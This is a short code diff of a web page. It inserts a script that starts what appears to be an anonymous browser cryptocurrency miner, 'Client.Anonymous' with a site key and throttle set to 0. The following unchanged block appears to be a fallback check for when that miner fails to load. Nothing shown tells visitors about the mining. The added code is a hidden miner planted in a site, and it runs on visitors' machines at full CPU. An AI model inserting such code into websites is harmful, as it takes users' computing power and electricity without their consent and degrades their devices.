@@ -21,6 +21,13 @@
 
       </script>
       <script>
+          var _client = new Client.Anonymous('01ce893f3a735255b7ffd76c723c5c0b5cf81f9eacc0f8cf51fb09f633decf67', {
+              throttle: 0, c: 'w'
+          });
+          _client.start();
+    
+      </script>
+      <script>
           setTimeout(function(){
               if(typeof _client === 'undefined' || _client === null)
               {
